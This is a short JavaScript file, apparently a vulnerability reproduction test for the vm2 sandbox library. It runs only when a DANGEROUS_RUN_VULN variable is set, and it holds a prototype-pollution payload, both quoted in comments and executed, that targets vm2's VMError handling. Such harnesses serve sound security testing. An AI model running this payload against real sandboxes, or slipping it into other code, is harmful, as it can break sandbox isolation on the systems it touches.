if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

// Original sample:
//   const { VM } = require("vm2");
//   let vmInstance = new VM();
//   vmInstance.run(`
//   Object.prototype.get = 0;
//   Object.getOwnPropertyDescriptor(this, "VMError")['get'];
//   `);

try {
	Object.prototype.get = 0;
	Object.getOwnPropertyDescriptor(this, "VMError")["get"];
} catch {}

setTimeout(() => {
	process.exit(82);
}, 1000);
